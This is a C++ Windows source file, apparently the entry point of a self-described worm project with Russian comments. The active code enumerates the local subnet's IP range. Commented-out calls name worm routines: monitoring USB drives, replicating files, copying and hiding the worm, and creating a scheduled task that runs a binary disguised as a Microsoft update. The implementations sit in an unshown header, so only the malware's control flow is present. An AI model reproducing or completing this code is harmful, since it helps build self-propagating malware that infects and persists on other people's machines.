#include "worm.h"
#pragma comment(lib, "Ws2_32.lib")


int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR lpCmdLine, int nCmdShow)

{
#ifdef _DEBUG
	attach_console();
#endif

	SetConsoleOutputCP(CP_UTF8);
	SetConsoleCP(CP_UTF8);

	std::locale loc("ru_RU.UTF-8");  // или std::locale loc("");
	std::wcout.imbue(loc);
	std::wcerr.imbue(loc);

	setlocale(LC_ALL, ".UTF8");
	
	
	worm worm1;
	worm::instance = &worm1;

	worm1.worm_was_started();

	
	auto net_info = worm1.get_local_ip_and_subnet();
	if (net_info.size() == 2)
	{
		string ip(net_info[0].begin(), net_info[0].end());
		string mask(net_info[1].begin(), net_info[1].end());

		auto range = worm1.generate_ip_range(ip, mask);
		for (const auto& ip_ws : range)
			wcout << ip_ws << endl;
	}

	




	

	worm1.worm_was_end();
	//return worm1.run_device_monitor(hInstance); // запуск мониторинга флешек



	//worm worm1;
	//worm::instance =&worm1;
	//
	//worm1.worm_was_started();

	//worm1.process_all_removable_disks();

	//worm1.scan_all_volumes();
	//worm1.print_list_dir();
	//worm1.collect_visible_files();
	////worm1.replicate_files(5);
	//worm1.copy_and_hide_worm();
	//worm1.create_scheduled_task(L"C:\\Users\\sseva\\AppData\\Roaming\\Microsoft\\Update\\update.exe");

	////worm1.print_file_to_copy();

	//worm1.worm_was_end();
	//return worm1.run_device_monitor(hInstance); // запуск мониторинга флешек
	
	
	//wcout<<get_own_path();
}